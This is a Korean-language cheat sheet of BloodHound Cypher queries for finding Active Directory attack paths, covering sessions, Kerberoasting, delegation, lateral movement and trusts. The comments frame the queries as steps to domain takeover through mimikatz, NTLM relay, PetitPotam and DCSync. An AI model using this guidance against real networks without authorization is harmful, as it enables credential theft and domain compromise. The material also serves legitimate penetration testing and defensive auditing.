### 세션 기반

```
// DA가 현재 세션 중인 컴퓨터
// HasSession: 해당 유저가 이 컴퓨터에 현재 로그인한 세션이 있음을 의미
// 발견된 컴퓨터에 로컬 관리자 권한이 있으면 mimikatz로 DA 크레덴셜 탈취 가능
// 세션 정보는 SharpHound 수집 시점에 따라 달라지므로 여러 번 수집하면 더 많이 발견됨
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i).*domain admins.*"
RETURN c.name, u.name

// 내가 AdminTo인 컴퓨터에서 DA 세션이 있는 경우 (원스텝 DA 장악)
// 내 계정 -> AdminTo -> 컴퓨터 -> HasSession -> DA 경로를 한 번에 탐색
// 이 결과가 나오면 해당 컴퓨터에 접근 후 mimikatz로 즉시 DA 크레덴셜 탈취 가능
MATCH (me:User {name:"JOHN@CORP.LOCAL"})-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c:Computer)
MATCH (c)-[:HasSession]->(da:User)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN me.name, c.name, da.name

// High Value 유저가 세션 중인 머신 전체
// admincount:true: 고권한 계정에 설정되는 속성 (DA 멤버 등)
// DA가 아니어도 고권한 계정이 로그인한 머신을 모두 파악 가능
MATCH (c:Computer)-[:HasSession]->(u:User)
WHERE u.admincount=true
RETURN c.name, u.name
ORDER BY c.name

// 특정 컴퓨터의 현재 세션 유저 확인
// 특정 서버나 DC에 누가 로그인해 있는지 파악할 때 사용
MATCH (c:Computer {name:"SERVER01.CORP.LOCAL"})-[:HasSession]->(u:User)
RETURN u.name

// 내가 접근 가능한 머신에서 로그인 중인 모든 유저
// 내가 관리자 접근 가능한 모든 머신의 세션 유저를 한 번에 파악
// 크레덴셜 탈취 우선순위를 결정하는 데 유용
MATCH (me:User {name:"JOHN@CORP.LOCAL"})-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c:Computer)
MATCH (c)-[:HasSession]->(u:User)
RETURN c.name, u.name
ORDER BY c.name
```

---

### Kerberoasting / AS-REP Roasting

```
// Kerberoastable 전체 목록 + 패스워드 나이
// hasspn:true: SPN이 등록된 계정 -> 모든 도메인 유저가 TGS를 요청할 수 있음
// pwdlastset 기준 오름차순 정렬 -> 오래된 패스워드 계정부터 우선 타겟
MATCH (u:User {hasspn:true, enabled:true})
RETURN u.name, u.serviceprincipalnames, u.pwdlastset
ORDER BY u.pwdlastset

// admincount=1 Kerberoastable 계정 (크래킹 성공 시 즉시 DA급)
// admincount:true인 계정은 고권한을 가짐 -> 크래킹 성공 시 즉시 도메인 장악 가능
MATCH (u:User {hasspn:true, enabled:true})
WHERE u.admincount=true
RETURN u.name, u.serviceprincipalnames, u.pwdlastset

// Kerberoastable 계정이 High Value 그룹 멤버
// 크래킹 성공 시 고가치 그룹 권한 즉시 획득 -> 우선 타겟
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
WHERE g.highvalue=true
RETURN u.name, g.name

// Kerberoastable 계정이 다른 컴퓨터에 AdminTo
// 크래킹 성공 시 해당 컴퓨터에 즉시 관리자 접근 가능
MATCH (u:User {hasspn:true})-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c:Computer)
RETURN u.name, c.name

// AS-REP Roastable 전체 + description (패스워드 힌트 확인)
// dontreqpreauth:true: DONT_REQ_PREAUTH 속성 설정 계정
MATCH (u:User {dontreqpreauth:true, enabled:true})
RETURN u.name, u.description

// AS-REP Roastable 계정이 고권한 그룹 멤버
MATCH (u:User {dontreqpreauth:true})-[:MemberOf*1..]->(g:Group)
WHERE g.highvalue=true OR g.admincount=true
RETURN u.name, g.name
```

---

### 위임 (Delegation)

```
// Unconstrained Delegation 머신 (DC 제외)
// unconstraineddelegation:true: 모든 서비스에 대해 사용자를 사칭 가능한 설정
// DC는 기본적으로 Unconstrained Delegation이 설정되어 있으므로 제외
// 해당 머신에 로그인한 계정의 TGT가 머신 메모리에 캐시됨 -> 탈취 가능
// Legacy: g.objectsid / CE: g.objectid
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.objectid ENDS WITH "-516"
WITH COLLECT(c1.name) AS domainControllers
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name IN domainControllers
RETURN c.name, c.operatingsystem

// Unconstrained Delegation 머신에서 DA 세션 있는 경우
// 해당 머신 장악 -> 메모리에서 DA TGT 추출 -> 도메인 완전 장악
// PrinterBug / PetitPotam으로 DA를 강제로 인증하게 만들어 TGT 탈취도 가능
MATCH (c:Computer {unconstraineddelegation:true})-[:HasSession]->(u:User)
WHERE u.admincount=true
RETURN c.name, u.name

// Unconstrained Delegation 머신에 AdminTo인 계정 + DA 세션 조합
// 내 계정 -> Unconstrained 머신 관리자 -> DA TGT 탈취 경로를 한 번에 탐색
MATCH (u:User)-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c:Computer {unconstraineddelegation:true})
MATCH (c)-[:HasSession]->(da:User {admincount:true})
RETURN u.name, c.name, da.name

// Constrained Delegation 설정된 계정/컴퓨터
// AllowedToDelegate: 특정 서비스에 대해서만 다른 유저를 사칭해 TGS 요청 가능
// u.allowedtodelegate: 위임이 허용된 SPN 목록 (어느 서비스에 접근 가능한지 확인)
MATCH p=(u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, labels(u), c.name, u.allowedtodelegate

// Constrained Delegation 대상이 DC인 경우 (DCSync 경로)
// DC의 LDAP 서비스에 위임 설정이 있으면 DA로 LDAP 접근 -> DCSync 가능
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
WHERE c.name =~ "(?i).*DC.*"
RETURN u.name, c.name

// RBCD (Resource-Based Constrained Delegation) 설정
// AllowedToAct: 타겟 컴퓨터 관점에서 누구의 위임을 허용하는지 설정
// GenericWrite 권한으로 타겟 컴퓨터의 msDS-AllowedToActOnBehalfOfOtherIdentity 수정 가능
MATCH p=(u)-[:AllowedToAct]->(c:Computer)
RETURN u.name, labels(u), c.name
```

---

### 그룹 중첩 분석

```
// DA 그룹의 전체 유효 멤버 (중첩 포함)
// MemberOf*1..: 직접 멤버 + 중첩 그룹을 통한 간접 멤버까지 모두 탐색
// 직접 DA 그룹 멤버가 아니어도 중첩 그룹을 통해 DA 권한을 가진 계정 발견 가능
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i).*domain admins.*"
RETURN u.name
ORDER BY u.name

// 그룹별 로컬 관리자 권한 컴퓨터 수 (중첩 포함)
// 어느 그룹 멤버가 되면 가장 많은 머신에 관리자 권한을 얻는지 파악
// 결과가 많은 그룹을 타겟으로 삼으면 적은 공격으로 많은 머신에 접근 가능
MATCH (g:Group)
OPTIONAL MATCH (g)-[:AdminTo]->(c1:Computer)
OPTIONAL MATCH (g)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
WITH g, COLLECT(c1) + COLLECT(c2) AS computers
UNWIND computers AS c
RETURN g.name AS GroupName, COUNT(DISTINCT(c)) AS AdminRightCount
ORDER BY AdminRightCount DESC

// 컴퓨터 계정이 다른 컴퓨터에 AdminTo인 경우
// 컴퓨터 계정 해시(머신 계정)를 탈취하면 다른 머신에 관리자 접근 가능
// NTLM 해시는 secretsdump나 mimikatz로 탈취 가능
MATCH (c1:Computer)-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c2:Computer)
RETURN c1.name, c2.name

// 특정 그룹에 AddMember 권한으로 멤버 추가 가능한 경로
// ANY(r IN relationships(p) ...): 경로의 엣지 중 하나라도 해당 조건을 만족하는지 확인
// AddMember를 통해 DA 그룹 멤버가 될 수 있는 경로만 필터링
MATCH p=shortestPath(
  (u:User {name:"JOHN@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
WHERE ANY(r IN relationships(p) WHERE type(r) = "AddMember")
RETURN p
```

---

### 횡적 이동 (Lateral Movement)

```
// SMB Signing 비활성 머신 (NTLM Relay 타겟)
// signing:false: SMB 서명이 비활성화된 머신 -> NTLM Relay 공격 가능
// Responder + ntlmrelayx 조합으로 인증을 릴레이해 관리자 권한 획득 가능
MATCH (c:Computer {signing:false})
RETURN c.name, c.operatingsystem

// 오래된 OS 머신 (알려진 취약점 공격 타겟)
// EternalBlue(MS17-010), PrintNightmare 등 패치되지 않은 취약점이 있을 가능성 높음
// =~ "(?i)...": 대소문자 구분 없이 정규표현식으로 OS 이름 필터
MATCH (c:Computer)
WHERE c.operatingsystem =~ "(?i).*(windows xp|windows 2000|windows 2003|windows vista|windows 7|windows server 2008).*"
RETURN c.name, c.operatingsystem

// 특정 유저가 RDP 가능한 머신
// CanRDP: Remote Desktop 접근 권한이 있는 엣지
// GUI나 xfreerdp로 원격 데스크탑 접근 가능 -> 상호작용 세션 획득
MATCH (u:User {name:"JOHN@CORP.LOCAL"})-[:MemberOf*0..]->(:Group)-[:CanRDP]->(c:Computer)
RETURN c.name

// 컴퓨터가 Exchange Trusted Subsystem 그룹 멤버인 경우
// Exchange Trusted Subsystem은 Exchange 서버들이 속하는 그룹으로 다른 Exchange 서버에 AdminTo 권한을 가짐
// Exchange 서버 한 대를 장악하면 다른 Exchange 서버에도 관리자 접근 가능
// PrinterBug으로 Exchange를 강제 인증하게 만들어 NTLM Relay도 가능
MATCH p=(c:Computer)-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(n:Computer)
WHERE g.name =~ "(?i).*exchange trusted subsystem.*"
RETURN p

// 각 유저가 로컬 관리자인 컴퓨터 수 (영향도 파악)
// AdminCount가 높은 계정일수록 크래킹/탈취 우선순위가 높음
// COUNT(DISTINCT(c)): 중복 없이 고유한 컴퓨터 수 계산
MATCH (u:User)
OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
WITH u, COLLECT(c1) + COLLECT(c2) AS computers
UNWIND computers AS c
RETURN u.name, COUNT(DISTINCT(c)) AS AdminCount
ORDER BY AdminCount DESC
```

---

### 도메인 신뢰 관계

```
// 도메인 신뢰 관계 전체 맵
// TrustedBy: 도메인 간 신뢰 관계 엣지
// 신뢰 관계가 있으면 한 도메인의 자격증명으로 다른 도메인 리소스에 접근 가능
MATCH p=(d1:Domain)-[:TrustedBy]->(d2:Domain)
RETURN p

// 양방향 신뢰 관계
// 양 도메인이 서로를 신뢰하면 어느 도메인에서 시작해도 다른 도메인으로 공격 경로 확장 가능
MATCH (d1:Domain)-[:TrustedBy]->(d2:Domain)-[:TrustedBy]->(d1)
RETURN d1.name, d2.name

// 신뢰 관계를 통한 DA까지 경로
// 도메인 신뢰를 통해 현재 도메인에서 다른 도메인의 DA에 도달하는 경로 탐색
MATCH p=shortestPath(
  (u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
WHERE ANY(r IN relationships(p) WHERE type(r) = "TrustedBy")
RETURN p

// 외부 도메인 유저가 내부 그룹 멤버인 경우 (SID History 악용 가능)
// 다른 도메인의 유저가 이 도메인의 그룹에 직접 멤버인 경우 탐지
// 외부 트러스트를 통한 권한 상승 경로로 활용 가능
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE u.domain <> g.domain
RETURN u.name, u.domain, g.name, g.domain
```

---

### 정리 / 통계

```
// 아직 Owned 안 된 DA 계정
// 타겟이 되는 DA 계정 중 아직 장악하지 못한 계정을 파악해 다음 목표 결정
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i).*domain admins.*"
AND NOT u.owned = true
RETURN u.name

// MSSQL SPN이 있는 컴퓨터 (SQL Server 타겟)
// MSSQLSvc SPN이 있으면 해당 서버에 SQL Server가 실행 중
// SQL SA 계정 크래킹 또는 MSSQL 관련 취약점 공격 대상
MATCH (c:Computer)
WHERE ANY(spn IN c.serviceprincipalnames WHERE spn CONTAINS "MSSQL")
RETURN c.name, c.serviceprincipalnames

// 전체 컴퓨터 OS 분포 (공격 대상 규모 파악)
// 어떤 OS가 많은지 파악해 공격 전략 수립에 활용
MATCH (c:Computer {enabled:true})
RETURN c.operatingsystem, COUNT(c) AS count
ORDER BY count DESC

// Domain Users 그룹이 AdminTo인 컴퓨터
// Legacy: g.objectsid / CE: g.objectid
MATCH (g:Group)-[:AdminTo]->(c:Computer)
WHERE g.objectid ENDS WITH "-513"
RETURN g.name, c.name
```

---

## 주요 엣지(관계) 설명

```
AdminTo              -> 로컬 관리자 (PtH, psexec, secretsdump 가능)
MemberOf             -> 그룹 멤버십 (상위 그룹 권한 상속)
GenericAll           -> 완전한 제어 (패스워드 변경, SPN 설정, 그룹 추가 등)
GenericWrite         -> 속성 수정 (SPN -> Kerberoasting, msDS-KeyCredentialLink -> Shadow Credentials)
WriteDACL            -> ACL 수정 -> GenericAll 부여 가능
WriteOwner           -> 소유자 변경 -> WriteDACL -> GenericAll
ForceChangePassword  -> 패스워드 강제 변경
AllowedToDelegate    -> Constrained Delegation (TGS 사칭 발급)
AllowedToAct         -> RBCD (Resource-Based Constrained Delegation)
HasSession           -> 현재 세션 (티켓 탈취 가능)
GetChanges           -> DCSync 권한 일부 (GetChangesAll과 함께여야 완전)
GetChangesAll        -> DCSync 권한 일부 (GetChanges와 함께여야 완전)
AddMember            -> 그룹에 멤버 추가 가능
ReadLAPSPassword     -> LAPS 패스워드 읽기
CanRDP               -> RDP 접근 가능
ExecuteDCOM          -> DCOM으로 원격 실행
AddKeyCredentialLink -> msDS-KeyCredentialLink 수정 -> Shadow Credentials
SQLAdmin             -> MSSQL SA 권한
TrustedBy            -> 도메인 신뢰 관계
```